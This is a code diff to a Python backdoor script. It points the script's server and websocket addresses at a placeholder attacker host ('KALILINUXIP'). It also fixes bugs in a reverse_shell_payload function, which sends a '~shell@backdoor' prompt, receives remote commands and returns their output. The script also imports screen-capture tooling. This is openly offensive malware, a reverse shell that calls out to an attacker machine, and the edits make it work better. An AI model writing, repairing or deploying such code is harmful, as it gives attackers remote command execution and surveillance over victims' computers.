@@ -12,8 +12,8 @@ import io
 import shlex
 from PIL import ImageGrab
 import threading
-SERVER_URL = "192.168.88.105:2020"
-WEBSOCKET_URL="ws://192.168.88.105:8765"
+SERVER_URL = "http://KALILINUXIP:2020"
+WEBSOCKET_URL="ws://KALILINUXIP:8765"
 PORT=12345
 IP_ADDRESS="192.168.88.105"
 banner = r"""
@@ -154,7 +154,7 @@ def reverse_shell_payload():
     s.send(banner.encode())
     while True:
         try:
-           s.send("~shell@backdoor ")
+           s.send(b"~shell@backdoor ")
            cmd = s.recv(1024).decode("utf-8").strip()
            if not cmd:
                continue
@@ -207,6 +207,6 @@ def reverse_shell_payload():
                    s.send(result.encode())
         except Exception as e:
             s.send(f"[-] Error: {e}\n".encode())
-        s.close()
+    s.close()
 if __name__ == "__main__":
     reverse_shell_payload()
